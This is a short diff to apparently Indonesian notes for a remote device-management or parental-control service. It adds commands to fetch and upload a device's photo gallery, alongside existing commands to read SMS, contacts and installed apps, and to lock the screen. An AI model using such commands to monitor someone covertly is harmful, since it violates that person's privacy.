@@ -37,6 +37,7 @@ get_installed_apps
 
 
 -=====
+get_all_gallery
 baca_sms
 get_contact
 get_installed_apps	Dapatkan daftar aplikasi terinstal
@@ -138,4 +139,18 @@ command
     "params": {
         "message": "Sudah waktunya istirahat. Layar akan dikunci dalam 10 detik."
     }
+}
+
+get_installed_apps
+{
+  "device_id": "98fbff301bd1c6ea",
+  "command": "get_installed_apps",
+  "params": {}
+}
+
+upload_gallery
+{
+  "device_id": "98fbff301bd1c6ea",
+  "command": "upload_gallery",
+  "params": {}
 }
